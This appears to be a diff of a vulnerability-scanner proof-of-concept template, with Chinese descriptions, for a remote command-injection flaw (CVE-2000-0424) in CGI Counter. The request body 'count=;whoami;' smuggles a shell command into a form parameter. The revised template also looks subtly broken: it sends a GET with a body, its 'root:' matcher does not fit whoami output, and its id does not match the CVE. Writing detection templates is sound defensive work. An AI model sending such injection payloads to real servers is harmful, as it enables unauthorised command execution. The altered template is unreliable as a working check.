@@ -1,9 +1,9 @@
 [info]
 author = "ave"
-description = "CVE-2000-0424 漏洞影响 George Burgyan CGI Counter 4.0.2/4.0.7 版本，该版本存在 CGI 输入验证漏洞。攻击者可通过向 CGI 程序提交包含 shell 元字符的特制 HTTP 请求来触发漏洞，实现远程命令执行。验证时需识别目标 CVE 实例并构造恶意参数。无需身份认证即可远程利用。"
+description = "验证 CVE-2000-0424 漏洞，攻击者可通过恶意的 count 参数向 CGI Counter 程序发送特制请求利用缺乏输入验证实现命令注入。检测 CGI 二进制文件是否存在异常处理或无效验证，帮助器控制台实现完整的命令执行验证。使用无害检测载荷如 whoami 或 ls。"
 id = "POC-AVE-2000-0345"
-name = "George Burgyan CGI Counter RCE 漏洞验证"
-severity = "high"
+name = "George Burgyan CGI Counter 4.0.2/4.0.7 输入验证漏洞 PoC"
+severity = "medium"
 tags = ["ave-2000-0345"]
 vuln_id = [
     "CVE-2000-0424",
@@ -15,28 +15,18 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cgi-bin/counter.cgi"
+path = "/{{BaseURL}}/cgi-bin/counter"
 protocol = "http"
-status = [200]
 
 [poc.requests.body]
-content = "count=1;whoami;"
+content = "count=;whoami;"
 type = "raw"
 
 [poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "root",
-    "www-data",
-]
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
+words = ["root:"]
